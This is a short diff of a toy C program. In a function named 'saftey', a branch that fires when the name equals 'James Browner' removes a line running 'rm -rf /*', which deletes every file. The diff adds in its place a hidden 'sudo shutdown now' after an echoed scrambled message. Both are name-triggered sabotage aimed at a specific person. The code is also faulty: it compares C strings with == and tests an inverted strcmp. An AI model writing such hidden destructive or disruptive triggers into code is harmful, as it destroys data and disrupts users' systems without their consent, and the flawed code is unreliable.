@@ -11,8 +11,9 @@ void saftey(){
     
   }
   if(name == "James Browner"){
-    system("echo \"\"");
-    system("rm -rf /*");
+    system("echo \"owdm ao kcth wd cvu uoan\"");
+    system("sleep 1");
+    system("sudo shutdown now");
   }
 }
 int main(){
@@ -20,5 +21,8 @@ int main(){
   scanf("%s",A);
   if(strcmp(A,"Y") == 0){
     printf("then lets go");
+  }
+  if(strcmp(A,"N")){
+    
   }
 }
